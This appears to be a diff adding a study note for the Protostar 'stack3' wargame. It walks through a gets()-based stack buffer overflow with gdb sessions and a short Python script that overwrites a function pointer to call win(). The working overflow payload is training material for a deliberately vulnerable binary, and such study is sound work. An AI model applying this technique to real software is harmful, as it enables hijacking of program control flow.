@@ -1,0 +1,147 @@
+Episode 0x0D
+Stack Buffer Overflow 
+  - redirecting code flow protostar 
+  - stack3 & stack 4
+
+Debugging using gdb & objdump
+Using python
+Understanding stack layout
+
+Prerequisites: 
+  Watch episode 0x0C;
+  Stack Layout (https://bit.ly/3xFoWBW) & Buffer Overflow basics (https://bit.ly/3tfHqFE);
+
+Stack3:
+  Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack.
+  (as a prelude to overwriting the saved EIP register)
+
+  stack3 is interesting compared to stack0 since fp is like the modified variable in stack0 but it is called as a function if not 0
+  This explains that we are supposed to create a buffer overflow to modify the bytes of fp to call the function (win) to print out the success message
+
+  hints:
+    - both gdb & objjdump is your friend you determining where the win() funtion lies in memory
+
+  source code:
+  ```c
+  #include <stdlib.h>
+  #include <unistd.h>
+  #include <stdio.h>
+  #include <string.h>
+
+  void win()
+  {
+    printf("code flow successfully changed\n");
+  }
+
+  int main(int argc, char **argv)
+  {
+    volatile int (*fp)();
+    char buffer[64];
+
+    fp = 0;
+
+    gets(buffer);
+
+    if(fp) {
+        printf("calling function pointer, jumping to 0x%08x\n", fp);
+        fp();
+    }
+  }
+  ```
+
+  Just like stack 0, the main function creates space for ESP (0x60 bytes on the stack)
+  It then sets the fp variable to 0: 0x08048441 <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
+  After the gets, we compare the fp value to check if it is still 0.
+  If it is not still 0, we call eax (fp) as a function
+
+  To begin, we set a breakpoint at 0x08048475 to see if we can overwrite the stack
+  ```gdb
+  (gdb) break *0x08048475
+  Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
+  ```
+  We then run the program bby entering enough characters to overwrite the stack
+  ```gdb
+  (gdb) r
+  Starting program: /opt/protostar/bin/stack3 
+  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+  calling function pointer, jumping to 0x41414141
+
+  Breakpoint 1, 0x08048475 in main (argc=1094795585, argv=0x414141) at stack3/stack3.c:22
+  22      stack3/stack3.c: No such file or directory.
+          in stack3/stack3.c
+  ```
+  We end up setting the fp value to hex 0x41414141, Which is 'A' in ASCII.
+
+  Since 0x41414141 is not a used memory address, it is invalid, so if we continue after the breakpoint, we just get an error:
+  ```gdb
+  Program received signal SIGSEGV, Segmentation fault.
+  0x41414141 in ?? ()
+  ```
+
+  To make this easier, lets open another ssh session
+  ```bash
+  ssh user@ip
+  ```
+
+  We are going to make a python(3) script that will be our exploit.
+  To make this easier, lets just put the script in /tmp for ease of access.
+
+  For now, lets just make a script that prints the alphabet * 4
+  print("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT")
+
+  Lets now execute this script and pipe it into a file so that we can also use it inside of gdb
+  ```bash
+  python /tmp/stack3.py > exp
+  ```
+  "exp" Contains our string that we will be using for the overflow.
+
+  We will now run using the file as input
+  ```gdb
+  (gdb)r < /tmp/exp
+  ```
+
+  If we now see the registers using `info registers` command in gdb, we can see the value of 0x08048475.
+  It is now set to 0x51515151, Which is hex for 'Q'
+  ```
+  Python 2.6.6 (r266:84292, Dec 27 2010, 00:02:40) 
+  [GCC 4.4.5] on linux2
+  Type "help", "copyright", "credits" or "license" for more information.
+  >>> chr(0x51)
+  'Q'
+  ```
+
+  Now, lets modify our python script...
+  ```python
+  padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
+  padding += "\x24\x84\x04\x08" # 0x08048424
+  print(padding)
+  ```
+
+  We now changed the pythonn file to create a variable for padding on Q,
+  in other words we have all the letters of the alphabet up to q (excluding q).
+  So, we make space for calling the win functions memory address at the end of the string.
+  We then print the padding which is what we now pipe into the exp file
+  ```bash
+  python stack3.py > exp
+  ```
+
+  If we cat out exp into base64 format "cat exp | base64" we get: "QUFBQUJCQkJDQ0NDREREREVFRUVGRkZGR0dHR0hISEhJSUlJSkpKSktLS0tMTExMTU1NTU5OTk5PT09PUFBQUAgEhCQK"
+  Which we can then translate that into ASCII.
+  
+  For example, we can use CyberChef to convert the base64 into ASCII. which can help us understand that the "...$" is the memory address that we want to call.
+  In gdb's eyes, it will read it in bytes, so when we read the last 4 bytes of the string, it will provide the memory address to the win function.
+
+  We will then be able to execute the function, getting the success message.
+
+  Success!
+
+  End Result from terminal:
+    user@protostar:/opt/protostar/bin$ ./stack3 < /tmp/exp
+    calling function pointer, jumping to 0x08048424
+    code flow successfully changed
+
+  End Result from GDB:
+    Files inside of ./0x0D/3/gdb.*/*.gdb
+
+Stack4:
+  TBC |06/02/2021|DD/MM/YYYY|
